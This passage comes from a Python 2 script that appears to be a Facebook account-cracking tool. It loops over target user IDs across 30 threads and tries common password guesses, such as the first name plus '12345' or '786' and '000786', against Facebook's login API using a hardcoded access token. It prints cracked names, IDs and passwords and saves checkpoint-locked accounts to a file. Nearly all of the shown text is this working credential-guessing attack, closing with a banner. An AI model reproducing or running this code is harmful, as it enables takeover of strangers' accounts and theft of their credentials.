				                                                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[!] \x1b[1;92m[OK]'					
									                               print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']					
									                               print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user				
									                               print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				                                                                           print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                           print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                           print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = '000786'									
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
				                                                                                   print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user										
				                                                                                   print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;98m      : \x1b[1;97m' + user
				                                                                                       print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[!] \x1b[1;92m[OK]'			
											                                       print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']			
											                                       print '\x1b[1;93m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user	
											                                       print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;91m[!] \x1b[1;96m[Checkpoint]'
				                                                                                                   print '\x1b[1;92m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                                                                   print '\x1b[1;94m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                                                                   print '\x1b[1;94m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
#Dev:MR-0FFIC9L ALON3
        print "\033[1;97m•-----------------\033[1;37mMR-0FFICI9L\033[1;97m-----------------•"
	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print "\033[1;97m«-----------------\033[1;37mBMR-0FFIC9L\033[1;97m-----------------»"
	print """
 \033[1;97m

 \033[1;96m █████╗ ██╗      ██████╗ ███╗   ██╗███████╗
 \033[1;91m██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝
 \033[1;92m███████║██║     ██║   ██║██╔██╗ ██║█████╗  
 \033[1;93m██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝  
 \033[1;95m██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗
 \033[1;96m╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
                                           
                                            

\033[1;96m ██████╗  ██████╗  ██████╗ ██████╗     ██╗     ██╗   ██╗ ██████╗██╗  ██╗
\033[1;95m██╔════╝ ██╔═══██╗██╔═══██╗██╔══██╗    ██║     ██║   ██║██╔════╝██║ ██╔╝
\033[1;94m██║  ███╗██║   ██║██║   ██║██║  ██║    ██║     ██║   ██║██║     █████╔╝ 
\033[1;93m██║   ██║██║   ██║██║   ██║██║  ██║    ██║     ██║   ██║██║     ██╔═██╗ 
\033[1;92m╚██████╔╝╚██████╔╝╚██████╔╝██████╔╝    ███████╗╚██████╔╝╚██████╗██║  ██╗
\033[1;91m╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
                                                                        
      
"""
	print "\033[1;97m«-----------------\033[1;37mKASHI-OFFICAL\033[1;97m-----------------»"
	raw_input("\n\033[1;97m[+]\033[1;97mBack")
	menu()

if __name__ == '__main__':
	login()
gin()
